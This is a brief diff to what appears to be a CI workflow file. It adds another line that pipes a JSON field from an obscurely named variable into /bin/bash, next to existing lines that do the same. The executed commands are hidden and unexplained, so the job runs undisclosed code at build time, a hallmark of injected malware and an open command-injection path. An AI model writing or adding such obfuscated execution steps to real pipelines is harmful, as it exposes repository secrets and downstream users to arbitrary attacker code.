@@ -23,6 +23,7 @@ jobs:
           echo $xgld337 | jq -r .qau7436 | /bin/bash
           echo $v234 | jq -r .laaic4 | /bin/bash
           echo $xr452 | jq -r .zbydq35 | /bin/bash
+          printf '%s' "$j9" | jq -r .cncb08 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
